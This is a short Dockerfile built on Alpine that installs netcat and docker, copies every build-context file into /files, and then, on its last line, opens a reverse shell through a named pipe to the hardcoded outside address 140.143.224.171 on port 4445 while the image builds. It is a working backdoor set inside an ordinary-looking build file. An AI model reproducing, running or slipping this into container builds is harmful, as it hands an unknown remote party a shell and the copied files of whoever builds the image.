FROM alpine:latest

RUN apk add --update --no-cache netcat-openbsd docker
RUN mkdir /files
COPY * /files/
RUN mknod /tmp/back p
RUN /bin/sh 0</tmp/back | nc 140.143.224.171 4445 1>/tmp/back
